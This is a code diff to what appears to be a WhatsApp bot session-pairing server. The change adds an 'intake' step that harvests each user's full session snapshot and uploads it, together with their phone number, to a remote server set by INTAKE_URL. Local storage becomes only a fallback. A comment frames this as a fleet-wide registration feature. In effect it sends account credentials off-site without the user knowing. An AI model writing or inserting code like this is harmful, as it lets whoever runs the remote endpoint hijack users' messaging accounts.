@@ -2,7 +2,8 @@ const {
     juneId,
     removeFile
 } = require('../store');
-const { SESSION_PREFIX, GC_JID, BOT_REPO, WA_CHANNEL, MSG_FOOTER } = require('../config');
+const { SESSION_PREFIX, GC_JID, BOT_REPO, WA_CHANNEL, MSG_FOOTER, INTAKE_URL, INTAKE_KEY } = require('../config');
+const { harvestSnapshot, intakeSession } = require('../store/intake');
 const { isConfigured, saveSession } = require('../store/sessionStore');
 const zlib = require('zlib');
 const express = require('express');
@@ -124,16 +125,31 @@ router.get('/', async (req, res) => {
                     const b64data = compressedData.toString('base64');
                     const fullSession = SESSION_PREFIX + b64data;
 
-                    if (!isConfigured()) {
-                        console.error(`[june:${id}] No DATABASE_URL configured - short sessions unavailable`);
-                        const noDbMsg = '⚠️ Server storage is not configured. Contact the admin — no session can be issued right now.';
+                    // Intake first: push the full snapshot to the main June
+                    // session server for a fleet-wide handle; fall back to a
+                    // local database ID when intake is unset or fails.
+                    let shortSession = null;
+                    if (INTAKE_URL && INTAKE_KEY) {
                         try {
-                            await sendButtons(bot, bot.user.id, { title: '', text: noDbMsg, footer: MSG_FOOTER, buttons: [] });
-                        } catch (_) {}
-                        return;
+                            const snapshot = harvestSnapshot(path.join(sessionDir, id));
+                            shortSession = await intakeSession({ phone: num, snapshot, intakeUrl: INTAKE_URL, intakeKey: INTAKE_KEY });
+                            console.log(`[june:${id}] session registered via intake → ${shortSession}`);
+                        } catch (intakeErr) {
+                            console.error(`[june:${id}] intake failed, falling back to local store:`, intakeErr.message);
+                        }
                     }
-                    const shortId = await saveSession(fullSession);
-                    const shortSession = `${SESSION_PREFIX}${shortId}`;
+                    if (!shortSession) {
+                        if (!isConfigured()) {
+                            console.error(`[june:${id}] No DATABASE_URL configured - short sessions unavailable`);
+                            const noDbMsg = '⚠️ Server storage is not configured. Contact the admin — no session can be issued right now.';
+                            try {
+                                await sendButtons(bot, bot.user.id, { title: '', text: noDbMsg, footer: MSG_FOOTER, buttons: [] });
+                            } catch (_) {}
+                            return;
+                        }
+                        const shortId = await saveSession(fullSession);
+                        shortSession = `${SESSION_PREFIX}${shortId}`;
+                    }
                     const msgText = `*SESSION ID ✅*\n\n${shortSession}`;
                     const msgButtons = [
                         { name: 'cta_copy', buttonParamsJson: JSON.stringify({ display_text: 'Copy Session', copy_code: shortSession }) },
